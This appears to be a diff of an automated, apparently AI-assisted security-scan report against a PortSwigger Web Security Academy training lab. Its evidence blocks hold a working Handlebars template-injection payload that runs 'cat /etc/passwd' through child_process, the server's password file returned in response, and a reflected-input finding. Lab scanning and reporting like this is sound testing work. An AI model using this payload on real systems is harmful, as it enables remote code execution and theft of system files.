+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $45.52
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=2&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/36.jpg&quot;&gt;
+                            &lt;h3&gt;Caution Sign&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $23.82
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=3&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/70.jpg&quot;&gt;
+                            &lt;h3&gt;Eye Projectors&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $87.83
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=4&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/7.jpg&quot;&gt;
+                            &lt;h3&gt;Conversation Controlling Lemon&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $83.15
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=5&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/48.jpg&quot;&gt;
+                            &lt;h3&gt;BBQ Suitcase&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $50.18
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=6&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/9.jpg&quot;&gt;
+                            &lt;h3&gt;Fur Babies&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $92.02
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=7&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/6.jpg&quot;&gt;
+                            &lt;h3&gt;Com-Tool&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $92.44
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=8&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/73.jpg&quot;&gt;
+                            &lt;h3&gt;Beat the Vacation Traffic&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $69.51
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=9&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/53.jpg&quot;&gt;
+                            &lt;h3&gt;High-End Gift Wrapping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $76.89
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=10&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/29.jpg&quot;&gt;
+                            &lt;h3&gt;Waterproof Tea Bags&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $65.86
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=11&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/42.jpg&quot;&gt;
+                            &lt;h3&gt;Pest Control Umbrella&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $28.31
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=12&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/58.jpg&quot;&gt;
+                            &lt;h3&gt;There is No &amp;apos;I&amp;apos; in Team&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $60.69
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=13&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/75.jpg&quot;&gt;
+                            &lt;h3&gt;Grow Your Own Spy Kit&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $90.96
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=14&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/21.jpg&quot;&gt;
+                            &lt;h3&gt;Snow Delivered To Your Door&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $62.09
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=15&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/20.jpg&quot;&gt;
+                            &lt;h3&gt;Single Use Food Hider&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $2.44
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=16&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/56.jpg&quot;&gt;
+                            &lt;h3&gt;More Than Just Birdsong&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $71.65
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=17&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/37.jpg&quot;&gt;
+                            &lt;h3&gt;The Giant Enter Key&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $25.01
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=18&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/51.jpg&quot;&gt;
+                            &lt;h3&gt;Real Life Photoshopping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $30.87
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=19&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/31.jpg&quot;&gt;
+                            &lt;h3&gt;Couple&amp;apos;s Umbrella&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $44.03
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=20&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/section&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6i915z-2r</code> — <code>artifacts/_/ev-mr6i915z-2r/</code></div><div class="lbl">REQUEST</div><pre>GET /?message=wrtz%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%7B%7B%23with%20%22e%22%7D%7D%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%7B%7Bthis.pop%7D%7D%7B%7Bthis.push%20%28lookup%20string.sub%20%22constructor%22%29%7D%7D%7B%7Bthis.pop%7D%7D%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%7B%7Bthis.pop%7D%7D%7B%7Bthis.push%20%22return%20require%28%27child_process%27%29.execSync%28%27cat%20%2Fetc%2Fpasswd%27%29%3B%22%7D%7D%7B%7Bthis.pop%7D%7D%7B%7B%23each%20conslist%7D%7D%7B%7B%23with%20%28string.sub.apply%200%20codelist%29%7D%7D%7B%7Bthis%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Feach%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Fwith%7D%7D HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 13934
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsEcommerce.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'&gt;Submit solution&lt;/button&gt;
+                            &lt;script src='/resources/labheader/js/submitSolution.js'&gt;&lt;/script&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-notsolved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Not solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;ecommerce&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;section class=&quot;ecoms-pageheader&quot;&gt;
+                        &lt;img src=&quot;/resources/images/shop.svg&quot;&gt;
+                    &lt;/section&gt;
+                    &lt;div&gt;wrtze2[object Object]function Function() { [native code] }2[object Object]root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+peter:x:12001:12001::/home/peter:/bin/bash
+carlos:x:12002:12002::/home/carlos:/bin/bash
+user:x:12000:12000::/home/user:/bin/bash
+elmer:x:12099:12099::/home/elmer:/bin/bash
+academy:x:10000:10000::/academy:/bin/bash
+messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
+dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
+postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
+mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
+avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
+saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
+colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
+
+&lt;/div&gt;
+                    &lt;section class=&quot;container-list-tiles&quot;&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/52.jpg&quot;&gt;
+                            &lt;h3&gt;Hydrated Crackers&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $98.34
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=1&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/15.jpg&quot;&gt;
+                            &lt;h3&gt;Pet Experience Days&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $45.52
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=2&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/36.jpg&quot;&gt;
+                            &lt;h3&gt;Caution Sign&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $23.82
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=3&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/70.jpg&quot;&gt;
+                            &lt;h3&gt;Eye Projectors&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $87.83
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=4&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/7.jpg&quot;&gt;
+                            &lt;h3&gt;Conversation Controlling Lemon&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $83.15
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=5&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/48.jpg&quot;&gt;
+                            &lt;h3&gt;BBQ Suitcase&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $50.18
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=6&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/9.jpg&quot;&gt;
+                            &lt;h3&gt;Fur Babies&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $92.02
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=7&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/6.jpg&quot;&gt;
+                            &lt;h3&gt;Com-Tool&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $92.44
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=8&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/73.jpg&quot;&gt;
+                            &lt;h3&gt;Beat the Vacation Traffic&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $69.51
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=9&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/53.jpg&quot;&gt;
+                            &lt;h3&gt;High-End Gift Wrapping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $76.89
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=10&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/29.jpg&quot;&gt;
+                            &lt;h3&gt;Waterproof Tea Bags&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $65.86
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=11&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/42.jpg&quot;&gt;
+                            &lt;h3&gt;Pest Control Umbrella&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $28.31
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=12&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/58.jpg&quot;&gt;
+                            &lt;h3&gt;There is No &amp;apos;I&amp;apos; in Team&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $60.69
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=13&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/75.jpg&quot;&gt;
+                            &lt;h3&gt;Grow Your Own Spy Kit&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $90.96
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=14&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/21.jpg&quot;&gt;
+                            &lt;h3&gt;Snow Delivered To Your Door&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $62.09
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=15&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/20.jpg&quot;&gt;
+                            &lt;h3&gt;Single Use Food Hider&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $2.44
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=16&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/56.jpg&quot;&gt;
+                            &lt;h3&gt;More Than Just Birdsong&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $71.65
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=17&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/37.jpg&quot;&gt;
+                            &lt;h3&gt;The Giant Enter Key&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $25.01
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=18&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/51.jpg&quot;&gt;
+                            &lt;h3&gt;Real Life Photoshopping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $30.87
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=19&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/31.jpg&quot;&gt;
+                            &lt;h3&gt;Couple&amp;apos;s Umbrella&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $44.03
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=20&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/section&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [burp✓] Input returned in response (reflected)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">✅ AI-verified by active re-test: Control (message=benign-out-of-stock-value, 25 chars) produced a 14456-byte body without the marker; both positive replays (message=umbraR3fl3ct7788, 16 chars) produced identical 14447-byte bodies — the exact 9-byte delta equals the value-length difference, proving the input is reflected once into the response, stable across two replays. (severity raised info→high: confirmed real, not info-only)
+
+The value of the &lt;b&gt;message&lt;/b&gt; request parameter is copied into the application's response. (confidence: CERTAIN) @ https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/</div>
+<div><b>Reproduction</b></div><pre>Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6j5znt-3c</code> — <code>artifacts/_/ev-mr6j5znt-3c/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+
+GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stockglfn8jz3in HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 14483
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsEcommerce.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
